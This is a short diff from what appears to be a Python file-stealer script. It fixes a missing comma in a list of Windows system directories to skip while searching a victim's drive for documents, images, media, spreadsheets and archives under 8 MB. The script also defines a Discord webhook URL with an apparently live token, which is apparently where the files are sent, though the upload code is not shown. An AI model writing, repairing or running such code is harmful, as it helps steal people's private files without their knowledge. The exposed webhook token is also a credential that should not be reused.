@@ -24,7 +24,7 @@ for hwnd in windows:
 # Replace with your Discord webhook URL
 WEBHOOK_URL = "https://discord.com/api/webhooks/1183011750610751539/5pbfhYiAne_g_NT1DXKX_m6wDxrwpsJvmYxP6YSUIkY6fflQS6YVsiJnGOcpmB3-kF9_"
 # Directories to ignore during file search
-BLACKLISTED_DIRS = ['C:\Windows\', 'C:\Users\USERPROFILE\AppData\','C:\Users\USERPROFILE\OneDrive\Documents\', 'C:\$SysReset\', 'C:\$WinREAgent\', 'C:\OneDriveTemp\', 'C:\PerfLogs\', 'C:\ProgramData\' 'C:\Program Files\', 'C:\Program Files (x86)\', 'C:\AMD\']
+BLACKLISTED_DIRS = ['C:\Windows\', 'C:\Users\USERPROFILE\AppData\','C:\Users\USERPROFILE\OneDrive\Documents\', 'C:\$SysReset\', 'C:\$WinREAgent\', 'C:\OneDriveTemp\', 'C:\PerfLogs\', 'C:\ProgramData\', 'C:\Program Files\', 'C:\Program Files (x86)\', 'C:\AMD\']
 MAX_FILE_SIZE_MB = 8
 def check_file(file_path):
     allowed_extensions = ['.txt', '.pdf', '.png', '.jpg', '.jpeg', '.gif', '.mp4', '.mp3', '.py', '.docx', '.xls', '.xlsx', '.docx', '.wav', '.xlsm', '.zip', '.mpeg', '.csv']
